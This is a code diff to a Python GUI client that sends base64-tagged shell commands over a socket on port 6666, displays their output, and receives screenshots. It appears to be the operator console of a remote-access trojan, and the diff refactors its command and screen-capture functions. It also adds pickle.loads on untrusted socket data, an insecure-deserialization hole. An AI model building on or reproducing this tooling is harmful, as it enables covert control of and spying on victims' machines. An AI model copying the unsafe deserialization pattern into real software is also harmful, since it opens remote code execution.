@@ -8,10 +8,11 @@ import rot13
 import base64
 import os
 from PIL import Image, ImageTk
+import pickle
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = int(6666)
 rot = rot13.Rot13()
-
+utf8 = 'utf8'
 
 def pass_auth():
     password = e2.get()
@@ -56,16 +57,15 @@ def execute():
         messagebox.showinfo(title='input command', message='Please input command.')
         return
     try:
-        s.send(bytes(('Y29tbWFuZA==' + str(command)).encode('utf8')))
+        s.send(bytes(('Y29tbWFuZA==.' + str(command)).encode('utf8')))
     except Exception as e:
-        type, value, trace = sys.exc_info()
-        messagebox.showwarning(title='Error', message=value)
+        messagebox.showwarning(title='Error', message=e)
         return
     raw_output = s.recv(1024).decode('utf8')
     if raw_output.startswith('b3V0cHV0Cg=='):
-        timee = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
         t1.config(state=NORMAL)
-        output = timee + ' command: ' + str(command) + '\n' + str(raw_output.split('b3V0cHV0Cg==')[1]) + '\n'
+        output = '{} command:{}\n{}\n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), command,
+                                              raw_output.split('b3V0cHV0Cg==')[1])
         t1.insert(END, output)
         t1.config(state=DISABLED)
 
@@ -77,21 +77,20 @@ def get_screenshot():
         messagebox.showwarning(title='Error', message=e)
         return
     s.settimeout(10)
-    if not s.recv(256) == b'size_qu':
-        time.sleep(1)
-    s.send(b'gs')
-    raw = s.recv(1024).decode('utf8')
-    if str(raw).startswith('si.'):
-        img_siz = int(raw.split('.')[1]) + 2000
+    if s.recv(1024) == b'l1':
+        s.send(b'l1conf')
+    raw_each_len = s.recv(65535)
+    each_len = pickle.loads(raw_each_len)
+    s.send(b'l1sconf')
+    s.send(b'start')
+    raw_list = list()
+    for each in each_len:
+        raw_list.append(s.recv(each + 100))
         s.send(b'conf')
-        print(img_siz)
-        raw_image = s.recv(img_siz)
-        print(raw_image)
-        print(sys.getsizeof(raw_image))
-        f = open(os.getcwd() + '/sav.png', 'w+b')
-        f.write(raw_image)
-        print('recvd')
-
+    pic = b''.join(raw_list)
+    f = open(os.getcwd() + '/sav.png', 'w+b')
+    f.write(base64.b64decode(pic))
+    f.close()
 
 def show_password():
     if not e2.get() == '':
